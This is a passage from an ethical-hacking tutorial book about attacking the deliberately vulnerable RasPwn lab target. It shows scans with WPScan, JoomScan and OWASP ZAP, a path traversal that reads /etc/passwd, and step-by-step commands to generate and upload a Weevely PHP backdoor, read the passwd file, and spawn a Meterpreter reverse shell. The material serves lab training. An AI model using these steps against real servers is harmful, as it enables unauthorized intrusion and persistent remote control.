- raw: "This will find a lot of code vulnerabilities:\n\n![](images/00179.gif)\n\n\
    Again, this will take forever to run on the RPi – I let it run all day and night\
    \ and it was still going. You can cancel it out with “Ctrl-c” when you want. Though\
    \ it is good to know that Sn1per does have this capability. \n\nIn the previous\
    \ Sn1per “Web” scan, we found multiple web apps running on the server. WordPress\
    \ & Joomla were detected, so let’s target these two with specialized tools that\
    \ are in Kali Linux. WPScan, which we covered previously, and JoomScan.\n\n###\
    \ Scanning RasPwn with WPScan\n\n![](images/00180.gif)\n\nTool Author: WPScan\
    \ Team\n\nTool Website: [https://sucuri.net](https://sucuri.net)\n\nLet’s perform\
    \ an aggressive scan against the WordPress v4 install on RasPwn:\n\n        wpscan\
    \ --url 192.168.99.13/wordpress4 --detection-mode aggressive\n\nAnd the result:\n\
    \n![](images/00181.jpeg)\n\n63 vulnerabilities! If you want, you can go after\
    \ them, the references provided give you information on the vulnerability and\
    \ possible ways to exploit them. Have fun! If you want you could also scan the\
    \ “wordpress3” install on the same server. \n\nNext, let’s scan the Joomla installs\
    \ for vulnerabilities.\n\n### Scanning for Joomla Vulnerabilities with JoomScan\n\
    \nTool Website: [https://www.owasp.org/index.php/Category:OWASP\\_Joomla\\_Vulnerability\\\
    _Scanner\\_Project](https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project)\n\
    \nTool GitHub Page: [https://github.com/rezasp/joomscan](https://github.com/rezasp/joomscan)\n\
    \nScanning RasPwn:\n\n        In a terminal, enter “joomscan -u 192.168.99.13/joomla-3”\n\
    \n![](images/00182.jpeg)\n\nJoomScan checks for a Firewall, detects the Joomla\
    \ version and then begins the vulnerability scan.  \n\nThe Results:\n\n![](images/00183.jpeg)\n\
    \nMultiple vulnerabilities are detected. Each one is listed along with the CVE\
    \ number and a website link explaining the issue. With this information you could\
    \ then move forward with exploiting the vulnerabilities. A copy of the results\
    \ can be found, stored by IP address, in the program “reports” directory:\n\n\
    ![](images/00184.jpeg)\n\nBoth HTML and txt versions of the reports are available.\
    \ \n\n### Scanning RasPwn with OWASP ZAP\n\nTool GitHub: [https://github.com/zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)\n\
    \nTool Wiki: [https://github.com/zaproxy/zaproxy/wiki/Introduction](https://github.com/zaproxy/zaproxy/wiki/Introduction)\n\
    \nThere are numerous web application scanning tools we could use against RasPwn.\
    \ One option is OWASP ZAP (Zed Attack Proxy), an easy to use tool for finding\
    \ vulnerabilities in web apps. I cover this utility extensively in my other books,\
    \ and it takes a very long time to run on RasPwn, but it would be a possible option. \
    \ \n\nTo start OWASP Zap:\n\n        In a Kali Terminal, enter “owasp-zap”\n\n\
            Accept the license agreement\n\n        Click, “No I don’t want to persist\
    \ this session”, and then “start”\n\n        In the URL to attack prompt, enter,\
    \ “http://192.168.99.13/mutillidae”\n\n        Click, “Attack”\n\n![](images/00185.jpeg)\n\
    \nOWASP ZAP then begins to actively scan the web app pages for vulnerabilities.\
    \ A live status is displayed in the bottom window. Any security issues can be\
    \ viewed under the “Alerts” tab. The alerts are color coded as to severity; red\
    \ is the most concerning. \n\nClick on any of the Alerts to learn more information\
    \ about the alert, including the attack used, a description of the attack and\
    \ possible solutions. \n\nAs seen below:\n\n![](images/00186.jpeg)\n\nYou can\
    \ then try the “attack” against the test website to see the response. Below is\
    \ a demonstration of a path traversal vulnerability. Not as common in modern web\
    \ apps as it used to be, this vulnerability would allow someone to pull information\
    \ from the webserver using a specially crafted URL. In this instance, the URL\
    \ includes numerous previous directory “../../../” commands followed by the “/etc/passwd”\
    \ file. When the URL is browsed to, it causes the web server to display the server’s\
    \ user file.\n\n![](images/00187.jpeg)\n\nWe covered this before, but take a few\
    \ minutes and look at the other alerts for additional exploitation routes. Before\
    \ we wrap up this chapter, let’s take a quick look at exploiting a file upload\
    \ vulnerability in Mutillidae using Weevely, the “Weaponized Web Shell”. \n\n\
    ### Weevely3\n\nTool GitHub: [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)\n\
    \nWeevely is a persistent, feature rich remote shell that can perform post exploitation\
    \ tasks. It is also very easy to use - Just generate a remote shell with Weevely,\
    \ upload it to the target webserver, then execute it. Once the shell is active\
    \ you have numerous commands at your disposal to interact with the target system.\n\
    \nSometimes vulnerable web servers allow you to upload files to them. This could\
    \ be abused by an attacker to upload a web shell. If the shell is then executed,\
    \ it gives the attacker access to the web server itself. Let’s see how to do this\
    \ against Mutillidae running on RasPwn.  \n\nTo generate a php back door:\n\n\
            In a Kali terminal, enter, “weevely generate password backdoor.php”\n\
    \n![](images/00188.jpeg)\n\nNow upload the file to our vulnerable test website,\
    \ RasPwn’s Mutillidae.\n\n1.  From the Web browser in Kali Linux, navigate to\
    \ the Mutillidae webpage: http://192.168.99.13/mutillidae/\n\n2.  From the menu,\
    \ select: “Others > Unrestricted File Upload > File Upload”\n\n3.  Select the\
    \ backdoor file that we just created:\n\n![](images/00189.jpeg)\n\nAnd then click\
    \ “Upload File”\n\n![](images/00190.jpeg)\n\nNotice the path where the file is\
    \ stored. Connect to that path with Weevely:\n\n        In the terminal, enter,\
    \ “weevely http://192.168.99.13/mutillidae/index.php?page=/tmp/backdoor.php password”\n\
    \nAnd we are in!\n\n![](images/00191.jpeg)\n\n        Type “help” for available\
    \ commands.\n\nAny commands that you run will be executed on the remote RasPwn\
    \ box.\n\n        Type “:system\\_info”\n\n![](images/00192.jpeg)\n\nNext, check\
    \ running processes:\n\n        Enter, “:system\\_procs”\n\n![](images/00193.jpeg)\n\
    \nLet’s check the user list “passwd” file:\n\n        Next, type, “:audit\\_etcpasswd”\n\
    \n![](images/00194.jpeg)\n\n#### Spawning a Secondary Remote Meterpreter Shell\
    \ \n\nSome people prefer using a Metasploit Meterpreter shell. We can actually\
    \ spawn a Meterpreter shell from an active Weevely shell. This will require us\
    \ to use two Terminal windows in Kali. One for the active Weevely shell and one\
    \ for the Metasploit shell. When done, it will look something like this: \n\n\
    ![](images/00195.jpeg)\n\nLet’s step through this process:\n\n1.  From the active\
    \ Weevely shell, enter, “:backdoor\\_meterpreter -lhost \\[Your Kali Linux IP\
    \ address\\]”.\n\n2.  The command will then give you a Msfconsole command to run\
    \ in a second Terminal Window. \n\n3.  Open a second Terminal window.\n\n4.  Copy\
    \ and paste the entire Msfconsole command into the second Terminal Window, and\
    \ then run it.\n\n![](images/00196.jpeg)\n\nMetasploit is now ready to catch the\
    \ shell spawn command from Weevely.  \n\n5.  In the first Terminal, enter the\
    \ “:backdoor\\_meterpreter -lhost \\[Kali IP Address\\]” command again.\n\nA Meterpreter\
    \ shell should open in the second terminal screen:\n\n![](images/00197.jpeg)\n\
    \nType, “help” to see available Meterpreter commands. Or you can just enter, “shell”\
    \ to get a full interactive shell, as if you were sitting at the webserver keyboard\
    \ and entering commands:\n\n![](images/00198.jpeg)\n\nJust type “exit” in both\
    \ Terminal windows when you are done, to exit out of both remote shells. Then,\
    \ hit “Ctrl-c” to exit Weevely. \n\n#### Conclusion\n\nThis was just a small overview\
    \ of using RasPwn as a lab test target. RasPwn has a ton of features and vulnerable\
    \ services that we did not cover. If you want to learn more about using Meterpreter,\
    \ remote shells and ethical hacking in general I highly recommend you check out\
    \ my Basic & Intermediate (soon to be updated and replaced as the “advanced”)\
    \ book, I cover many of these topics in much greater detail. \n\n## Chapter 9\n\
    \n## P4wnP1 A.L.O.A.\n\nTool Author: MaMe82"
